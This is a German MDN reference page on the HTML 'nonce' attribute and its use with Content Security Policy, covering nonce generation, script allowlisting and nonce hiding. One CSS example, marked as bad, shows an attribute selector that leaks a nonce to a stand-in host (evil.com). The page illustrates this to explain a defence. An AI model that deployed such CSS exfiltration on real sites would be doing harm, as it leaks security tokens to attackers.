---
title: HTML-Attribut `nonce`
short-title: nonce
slug: Web/HTML/Reference/Global_attributes/nonce
l10n:
  sourceCommit: 7885271e36e9d2744296c01f400653f63caa6f75
---

{{HTMLSidebar("Global_attributes")}}

Das **`nonce`** [globale Attribut](/de/docs/Web/HTML/Reference/Global_attributes) ist ein Inhaltsattribut, das eine kryptographische Nonce ("Zahl, die einmal verwendet wird") definiert. Es kann von der [Content Security Policy (CSP)](/de/docs/Web/HTTP/Guides/CSP) verwendet werden, um zu bestimmen, ob ein bestimmter Abruf für ein bestimmtes Element durchgeführt werden darf.

## Beschreibung

Das Attribut `nonce` ist nützlich, um bestimmte Elemente auf die Allowlist zu setzen, wie z.B. ein bestimmtes Inline-Skript oder Stil-Elemente. Es kann Ihnen helfen, die Verwendung der [CSP](/de/docs/Web/HTTP/Guides/CSP) `unsafe-inline`-Direktive zu vermeiden, die _alle_ Inline-Skripte oder -Stile auf die Allowlist setzen würde.

> [!NOTE]
> Verwenden Sie `nonce` nur in Fällen, in denen Sie keine andere Möglichkeit haben, unsichere Inline-Skript- oder Stil-Inhalte zu vermeiden. Wenn Sie `nonce` nicht benötigen, verwenden Sie es nicht. Wenn Ihr Skript statisch ist, könnten Sie stattdessen einen CSP-Hash verwenden.
> (Siehe Hinweise zur Verwendung von [unsicheren Inline-Skripten](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src#unsafe_inline_script).)
> Versuchen Sie immer, die [CSP](/de/docs/Web/HTTP/Guides/CSP)-Schutzmaßnahmen vollständig zu nutzen und vermeiden Sie Nonces oder unsichere Inline-Skripte wann immer möglich.

### Verwendung von nonce zum Erstellen einer Allowlist für ein `<script>`-Element

Es gibt einige Schritte, um ein Inline-Skript mit dem Nonce-Mechanismus auf die Allowlist zu setzen:

#### Generierung von Werten

Generieren Sie von Ihrem Webserver aus einen zufälligen, base64-codierten String von mindestens 128 Bit Daten aus einem kryptographisch sicheren Zufallszahlengenerator. Nonces sollten jedes Mal unterschiedlich sein, wenn die Seite geladen wird (Nonce nur einmal!). Zum Beispiel in nodejs:

```js
import crypto from "node:crypto";

crypto.randomBytes(16).toString("base64");
// '8IBTHwOdqNKAWeKl7plt8g=='
```

#### Allowlisting von Inline-Skript

Die im Backend-Code generierte Nonce sollte nun für das Inline-Skript verwendet werden, das Sie auf die Allowlist setzen möchten:

```html
<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
  // …
</script>
```

#### Senden einer Nonce mit einem CSP-Header

Sie müssen schließlich den Nonce-Wert in einem [`Content-Security-Policy`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy)-Header senden (vorangestellt mit `nonce-`):

```http
Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
```

### Zugriff auf Nonces und das Verbergen von Nonces

Aus Sicherheitsgründen ist das Attribut `nonce` im Inhalt versteckt (ein leerer String wird zurückgegeben).

```js example-bad
script.getAttribute("nonce"); // returns empty string
```

Die [`nonce`](/de/docs/Web/API/HTMLElement/nonce)-Eigenschaft ist der einzige Weg, um auf Nonces zuzugreifen:

```js example-good
script.nonce; // returns nonce value
```

Das Verbergen von Nonces hilft, Angreifer daran zu hindern, Nonce-Daten über Mechanismen zu extrahieren, die Daten aus Inhaltsattributen abrufen können, wie folgt:

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [`HTMLElement.nonce`](/de/docs/Web/API/HTMLElement/nonce)
- [Content Security Policy](/de/docs/Web/HTTP/Guides/CSP)
- CSP: [`script-src`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src)
